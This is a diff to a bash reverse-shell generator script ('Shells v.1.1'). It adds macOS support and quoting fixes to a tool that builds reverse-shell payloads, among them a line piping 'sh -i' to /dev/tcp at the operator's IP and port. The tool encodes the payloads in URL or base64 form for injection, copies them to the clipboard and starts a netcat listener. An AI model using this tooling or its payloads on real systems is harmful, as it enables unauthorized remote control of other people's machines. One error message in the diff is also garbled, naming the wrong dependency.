@@ -1,6 +1,7 @@
 #!/bin/bash
 #By Andreas Finstad - 4ndr34z
 #Twitter handle: @4nqr34z
+#Shells v.1.1
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -16,7 +17,7 @@ yellowprint() { printf "${YELLOW}%s${RESET}\n" "$1"; }
 magentaprint() { printf "${MAGENTA}%s${RESET}\n" "$1"; }
 cyanprint() { printf "${CYAN}%s${RESET}\n" "$1"; }
 fn_bye() { printf "\n\nShell you later!\n\n"; exit 0; }
-fn_fail() { echo "That is just not an option!" exit 1; }
+fn_fail() { echo "That is just not an option!"; exit 1; }
 #Header
 function header () {
 clear
@@ -30,6 +31,7 @@ yellowprint "
         
 "
 }
+OS=$(uname)
 
 #Check dependencies
 benc=`which basenc`
@@ -37,9 +39,17 @@ benc=`which basenc`
 if [ "$?" == 1 ]
 then
       header
-                redprint "$0 depends on basenc and cannot continue.
-Install on Debian: sudo apt install coreutils
+      if [[ $OS == "Darwin" ]]
+      then
+    redprint "$0 depends on basenc from coreutils and cannot continue.
+Install on MacOS using homebrew: brew install coreutils"
+    else
+                redprint "$0 depends on rlwrap and cannot continue.
+Install on Debian: sudo apt install rlwrap
 "
+    fi
+                
+
 exit
 fi
 
@@ -49,8 +59,7 @@ if [ "$?" == 1 ]
 then
       header
                 redprint "$0 depends on netcat and cannot continue.
-Install on Debian: sudo apt install netcat
-"
+Install on Debian: sudo apt install netcat"
 exit
 fi
 
@@ -59,10 +68,16 @@ rlwrap=`which rlwrap`
 if [ "$?" == 1 ]
 then
       header
+    if [[ $OS == "Darwin" ]]
+    then
+    redprint "$0 depends on rlwrap and cannot continue.
+Install on MacOS using homebrew: brew install rlwrap"
+    else
                 redprint "$0 depends on rlwrap and cannot continue.
 Install on Debian: sudo apt install rlwrap
 "
-exit
+    fi
+read -p "Press any key to continue without rlwrap"
 fi
 
 
@@ -81,8 +96,18 @@ urlencodeme() {
 
 
 #Find IP
-int=$(route | grep '^default' | grep -o '[^ ]*$')
-myip=$(ip -4 a show dev $int |grep inet|awk -F "inet" {'print $2'}|cut -d/ -f1 | xargs)
+if [[ $OS == "Darwin" ]]
+then
+     myip=$(ipconfig getifaddr en0)
+else
+    int=$(route | grep '^default' | grep -o '[^ ]*$')
+    myip=$(ip -4 a show dev $int |grep inet|awk -F "inet" {'print $2'}|cut -d/ -f1 | xargs)
+fi
+
+
+
+
+
 myport="4444"
 
 header
@@ -149,8 +174,8 @@ then
     rev=$(urlencodeme $rev)
 elif [[ $1 == "urlx2" ]] 
 then
-    rev=$(urlencodeme $rev)
-    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
 
 elif [[ $1 == "base64" ]] 
 then
@@ -168,11 +193,11 @@ rev="sh -i >& /dev/tcp/$IP/$PORT 0>&1"
 
 if [[ $1 == "url" ]] 
 then
-    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme "$rev")
 elif [[ $1 == "urlx2" ]] 
 then
-    rev=$(urlencodeme $rev)
-    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
 
 elif [[ $1 == "base64" ]] 
 then
@@ -205,13 +230,13 @@ if [[ $2 == "url" ]]
 
 then
 
-    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme "$rev")
 
 elif [[ $2 == "urlx2" ]] 
 
 then
-    rev=$(urlencodeme $rev)
-    rev=$(urlencodeme $rev)
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
 fi
 echo -n $rev | xclip -sel c
 listen
@@ -239,10 +264,22 @@ Choose an option [1]:  "
 
     case $ans in
     1)
+        if [[ $OS == "Darwin" ]]
+        then
+        printf "\n\n";$rlwrap -cAr $nc -lvn $PORT
+        else
         printf "\n\n";$rlwrap -cAr $nc -lvnp $PORT
+        fi
+        
         ;;
     2)
+        if [[ $OS == "Darwin" ]]
+        then
+        printf "\n\n";$nc -lvn $PORT
+        else
         printf "\n\n";$nc -lvnp $PORT
+        fi
+        
         ;;
     3)
         exit
@@ -255,7 +292,12 @@ Choose an option [1]:  "
         fn_bye
         ;;
     *)
+        if [[ $OS == "Darwin" ]]
+        then
+        printf "\n\n";$rlwrap -cAr $nc -lvn $PORT
+        else
         printf "\n\n";$rlwrap -cAr $nc -lvnp $PORT
+        fi
         ;;
     esac
 
